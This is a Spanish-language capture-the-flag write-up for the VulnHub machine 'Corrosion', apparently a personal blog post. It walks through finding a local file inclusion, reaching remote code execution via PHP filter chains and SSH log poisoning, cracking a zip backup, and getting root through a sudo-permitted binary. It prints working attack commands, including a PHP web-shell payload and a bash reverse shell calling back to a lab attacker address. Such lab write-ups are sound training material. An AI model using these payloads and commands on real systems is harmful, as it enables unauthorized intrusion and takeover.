---
title: Corrosion
date: 2024-09-11
categories: [WRITEUPS, VulnHub]
tags: []  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

Buenas, en esta máquina encontraremos 2 vías de explotación, **PHP Filter Chains** y **Log Poisoning**, ambas para acceder al servidor, y para la escalada de privilegios nos aprovecharemos de los permisos de **SUDO** del usuario sobre un script.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos, será un escaneo con *NMAP*, para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open -T5 10.10.10.5 -n -Pn -v
```

![picture](/assets/images/vulnhub/corr1.png){: w="600" h="300" }

Una vez vistos los puertos abiertos, iré al navegador para ver que contenido está corriendo por el puerto **80**.

En un principio, encuentro una página por defecto de **Apache2**.

![picture](/assets/images/vulnhub/corr2.png)

Al no encontrar nada en el código fuente de la página, a continuación realizaré **Fuzzing** con **Gobuster** para intentar encontrar archivos y rutas mediante un ataque de fuerza bruta.

```bash
gobuster dir -u http://10.10.10.5 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt,.php,.html -b 404,403 -t 200
```

Y nos encuentra 2 rutas.

![picture](/assets/images/vulnhub/corr3.png)

En la ruta "**/tasks**", encontramos un archivo de texto, el cual contiene lo siguiente.

![picture](/assets/images/vulnhub/corr4.png)

![picture](/assets/images/vulnhub/corr5.png)

Puede sernos útiles de cara a la explotación.

Y en la ruta "**/blog-post**", encontramos un blog en desarrollo, junto con un posible nombre de usuario llamado "*randy*", y una fotografía.

![picture](/assets/images/vulnhub/corr6.png)

Volviendo a realizar **Fuzzing**, sobre la ruta "**/blog-post**", encuentro otras 2 rutas más.

```bash
gobuster dir -u http://10.10.10.5/blog-post -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt,.php,.html -b 404,403 -t 200
```

![picture](/assets/images/vulnhub/corr7.png)

Si introducimos en el navegador web la ruta "**/uploads**", nos redirige a su ruta padre, y nos muestra el mismo contenido.

Pero si nos metemos en la ruta "**/archives**", encontramos un archivo **PHP**.

![picture](/assets/images/vulnhub/corr8.png)

Si clicamos sobre el archivo no muestra nada de contenido.

---

## **Explotación**

Al tener un archivo **PHP**, voy a intentar encontrar mediante fuerza bruta un parámetro por el cual podamos leer un archivo local del servidor, un **LFI** (*Local File Inclusion*).

Para ello utilizaremos la herramienta **FFUF**, para indicarle a la herramienta en que sitio queremos que pruebe todos los parámetros posibles del diccionario que le voy a indicar, tiene una palabra interna llamada **FUZZ**.

Intentaremos leer el archivo "**/etc/passwd**".

```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.10.5/blog-post/archives/randylogs.php?FUZZ=/etc/passwd' -t 200
```

Al introducir el comando, nos saldrán miles de peticiones con un código de estado exitoso (*200*), con  una tamaño de 0, y con el número de palabras igual a 1, esto puede darse por la configuración de la página, o porque la respuesta sea estática para todas las peticiones.

![picture](/assets/images/vulnhub/corr9.png)

Para ello, tendremos que indicarle a la herramienta que no muestre las peticiones cuya respuesta de palabras sea igual a 1.

```bash
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://10.10.10.5/blog-post/archives/randylogs.php?FUZZ=/etc/passwd' -t 200 -fw 1
```

Y obtenemos un resultado exitoso con el parámetro **file**, así que tenemos un **LFI**.

![picture](/assets/images/vulnhub/corr10.png)

Si nos vamos al navegador podremos ver el contenido del archivo "**/etc/passwd**".

![picture](/assets/images/vulnhub/corr11.png)

### **Explotaciones posibles**

#### 1. *PHP Filter Chains*

La primera explotación que voy a probar es la de utilizar **Filter Chains en PHP**. [Explicación de los Filter Chains al final](#explicación-de-filter-chains).

Cuando tenemos un **LFI** sin la capacidad de ejecutar comandos, la idea principal siempre es derivarlo a un **RCE** (*Remote Code Execution*), para ello vamos a utilizar los **Filter Chains**.

Utilizaremos el generador de **Filter Chains** del siguiente repositorio de [**Github**](https://github.com/synacktiv/php_filter_chain_generator).

Para utilizar la herramienta, simplemente tenemos que clonar el repositorio, y ejecutarla usando el parámetro "*--chain*", más la cadena en **PHP** que queramos ejecutar.

En mi caso ejecutaré primero el comando **whoami**.

```bash
python3 php_filter_chain_generator.py --chain '<?php system("whoami");?>'
```

Al generar el código, lo copiaremos, y lo pegaremos después del signo igual en el **LFI**.

![picture](/assets/images/vulnhub/corr12.png)

Y una vez lo ejecutemos, tendremos el output del comando ejecutado.

![picture](/assets/images/vulnhub/corr13.png)

A continuación, la idea es generar un **Command Injection**, que es la capacidad de ejecutar comandos desde el navegador.

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
```

Copiamos el código generado, y lo pegamos.

![picture](/assets/images/vulnhub/corr14.png)

Y lo ejecutamos.

![picture](/assets/images/vulnhub/corr15.png)

Una vez lo hayamos ejecutado, en la parte final de nuestro código, pondremos lo siguiente.

```bash
&cmd='comando a ejecutar'
```

En mi caso he puesto el comando **id**.

```bash
&cmd=id
```

Y obtenemos el output del comando.

![picture](/assets/images/vulnhub/corr16.png)

A continuación, la idea es obtener una **Reverse Shell** en nuestra máquina local, para poder ejecutar comandos desde la terminal.

Para ello ejecutaremos lo siguiente. (los signos "**&**" hay que codificarlos en **URL**, "**%26**" porque si no no funciona)

```bash
bash -c "bash -i >%26 /dev/tcp/10.10.10.4/4444 0>%261"
```

Pero antes de ejecutarlo, tendremos que ponernos en escucha con un **Listener** con **ncat** por el puerto indicado en la **Reverse Shell**.

```bash
nc -nlvp 4444
```

Y una vez estemos en escucha, lo ejecutamos en el navegador.

![picture](/assets/images/vulnhub/corr17.png)

Y tendremos acceso a la máquina como el usuario **www-data***.

![picture](/assets/images/vulnhub/corr18.png)

#### 2. *Log Poisoning*

Como habíamos visto antes en la [Imagen](/assets/images/vulnhub/corr5.png), decían que cambiasen los permisos de **auth log**, que es el registro de logs del sistema.

Un **Log Poisoning** es el envenenamiento de Logs con código **PHP**.

Al tener el **LFI**, y tener la capacidad de ver el archivo **auth.log** en tiempo real, podemos intentar envenenar los logs para obtener un **RCE** mediante **SSH**, ya que habíamos comprobado que estaba el servicio corriendo.

![picture](/assets/images/vulnhub/corr19.png)

Si nos intentamos conectar con un usuario inexistente llamado "prueba", podemos ver el error en el navegador el la ruta del archivo **/var/log/auth.log**.

![picture](/assets/images/vulnhub/corr20.png)

![picture](/assets/images/vulnhub/corr21.png)

Para ejecutarlo, nos iremos a **Metasploit**, y usaremos el exploit "auxiliary/scanner/ssh/ssh_login".

```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME <?php system($_GET['cmd2']); ?>
set PASSWORD 123456
set rhosts 'Ip servidor'
```

![picture](/assets/images/vulnhub/corr22.png)

Y corremos el exploit.

![picture](/assets/images/vulnhub/corr23.png)

Comprobamos que sale en el archivo de los logs.

![picture](/assets/images/vulnhub/corr24.png)

Y si añadimos lo siguiente en la **URL**.

![picture](/assets/images/vulnhub/corr25.png)

Comprobamos que podemos ejecutar comandos.

![picture](/assets/images/vulnhub/corr26.png)

---
## **Escalada de privilegios**

Dentro de la ruta "**/var**", encontramos una carpeta llamada *backups*, y dentro de ella, un archivo **ZIP** cuyo propietario es **root**, y no podemos descomprimir.

![picture](/assets/images/vulnhub/corr27.png){: w="600" h="300" }

Nos montamos un servidor **HTTP** con **Python3**, y la descargo desde mi máquina local.

- Servidor

```bash
python3 -m http.server 1234
```

- Máquina local

```bash
wget http://10.10.10.5:1234/user_backup.zip
```

![picture](/assets/images/vulnhub/corr28.png)

Al intentar descomprimir el archivo, nos pide una contraseña, voy a intentar crackear la contraseña con **John The Ripper**, para ello, convertimos el archivo en uno que **John The Ripper** pueda entender con la herramienta **Zip2john**.

```bash
zip2hjohn user_backup.zip > hash
```

![picture](/assets/images/vulnhub/corr29.png)

Y ejecutamos **John The Ripper** con el diccionario **rockyou.txt** y el hash, y al cabo de un rato nos encuentra la contraseña.

![picture](/assets/images/vulnhub/corr30.png)

Al descomprimirlo, obtenemos los siguientes archivos.

![picture](/assets/images/vulnhub/corr31.png)

En el archivo "*my_password.txt*", hay una contraseña, intentando entrar mediante **SSH** y el usuario *randy*, obtengo resultado.

![picture](/assets/images/vulnhub/corr32.png){: w="600" h="300" }

En su carpeta personal, obtengo la primera **flag** de usuario.

![picture](/assets/images/vulnhub/corr33.png)

### Escalada de privilegios a Root

Listando los permisos de sudo del usuario obtengo lo siguiente.

![picture](/assets/images/vulnhub/corr34.png)

En el archivo descomprimido, tenemos un archivo llamado igual que el archivo en el que tenemos permisos de **SUDO**.

Viendo los 2 archivos no tienen el mismo contenido.

 - Archivo descomprimido. 
	
	El archivo establece los privilegios de usuario y grupo como **root** (UID y GID 0), además de mostrar la fecha, el archivo hosts y el *kernel* del sistema.
	
	![picture](/assets/images/vulnhub/corr35.png)

- Archivo con permisos.
	
	Es un binario.
	
	![picture](/assets/images/vulnhub/corr36.png)


Podemos crear un archivo con el mismo contenido, modificándolo para que nos devuelva una bash como el usuario **root**. 

Lo compilamos y lo llamamos "*easysysinfo*".

![picture](/assets/images/vulnhub/corr37.png)

Y al ejecutarlo con **sudo**, obtenemos una bash como **root**

![picture](/assets/images/vulnhub/corr38.png)

En la carpeta personal encontramos la flag de **root**.

![picture](/assets/images/vulnhub/corr39.png)

*(TAMBIÉN PODRÍAMOS HABER ESCALADO PRIVILEGIOS DE ROOT CON EL USUARIO **www-data** DIRECTAMENTE, YA QUE LA VERSIÓN DE PKEXEC ES VULNERABLE A PWNKIT.)*

---
---

### Explicación de Filter Chains

Un **filter chain** en PHP es una técnica que combina varios filtros o funciones en una cadena para manipular la entrada o salida de datos. En el contexto de vulnerabilidades, se utiliza para aprovechar una debilidad en un servidor, como la inclusión de archivos locales (LFI), y transformar esa debilidad en algo más peligroso.

- LFI con filter chains y base64

En una vulnerabilidad **LFI** (Local File Inclusion), normalmente solo puedes leer archivos locales del servidor, pero no ejecutar comandos. Sin embargo, si PHP tiene habilitado el filtro `php://filter`, puedes usarlo para codificar la salida de un archivo en base64. Esto permite leer el contenido de archivos binarios o protegidos como si fuera texto.

- Ejecución de comandos en un servidor

Los **filter chains** en combinación con LFI y filtros base64 permiten que, si logras incluir un archivo PHP malicioso o cargar código dentro de un archivo vulnerable (como logs), puedas leer y decodificar ese código, y en algunos casos, transformarlo en ejecución de comandos remotos (RCE).